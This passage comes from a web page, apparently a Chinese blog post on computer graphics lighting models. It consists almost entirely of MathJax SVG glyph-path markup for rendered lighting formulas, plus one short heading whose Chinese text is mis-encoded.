153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-I-1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path><path id="MJX-1-TEX-I-1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path><path id="MJX-1-TEX-I-1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path><path id="MJX-1-TEX-I-1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path><path id="MJX-1-TEX-I-210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path><path id="MJX-1-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path><path id="MJX-1-TEX-N-38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D460" xlink:href="#MJX-1-TEX-I-1D460"></use></g></g></g><g data-mml-node="mo" transform="translate(1125.4,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(2181.2,0)"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mi" transform="translate(3059.2,0)"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g><g data-mml-node="mi" transform="translate(3588.2,0)"><use data-c="1D465" xlink:href="#MJX-1-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(4160.2,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(4549.2,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(5452.4,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(5952.6,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(6552.6,0)"><use data-c="2C" xlink:href="#MJX-1-TEX-N-2C"></use></g><g data-mml-node="mn" transform="translate(6997.3,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g><g data-mml-node="mo" transform="translate(7497.3,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(8108.5,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="msub" transform="translate(8608.7,0)"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(10154.5,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(11154.7,0)"><g data-mml-node="mi"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D439" xlink:href="#MJX-1-TEX-I-1D439"></use></g></g></g><g data-mml-node="mo" transform="translate(12526.4,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(12915.4,0)"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(14045.6,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mfrac" transform="translate(14434.6,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(1100.2,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(2100.4,0)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g></g><g data-mml-node="mn" transform="translate(1270.2,-686)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g><rect width="2800.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(17475.1,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(17864.1,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(18686.3,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(19186.5,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="msup" transform="translate(19762.5,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g></g></g><g data-mml-node="mstyle" transform="translate(20855.4,0)"><g data-mml-node="mspace"></g></g></g></g></svg></mjx-container>

<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>æ€»ç»“äº†å…‰ç…§æ¨¡å‹çš„æ¦‚è¿°</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -43.845ex" xmlns="http://www.w3.org/2000/svg" width="72.885ex" height="88.821ex" role="img" focusable="false" viewBox="0 -19879.5 32215.1 39258.9" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path><path id="MJX-1-TEX-I-1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path><path id="MJX-1-TEX-I-1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path><path id="MJX-1-TEX-I-1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path><path id="MJX-1-TEX-I-1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path><path id="MJX-1-TEX-I-1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path><path id="MJX-1-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path><path id="MJX-1-TEX-I-1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-I-1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path><path id="MJX-1-TEX-I-1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 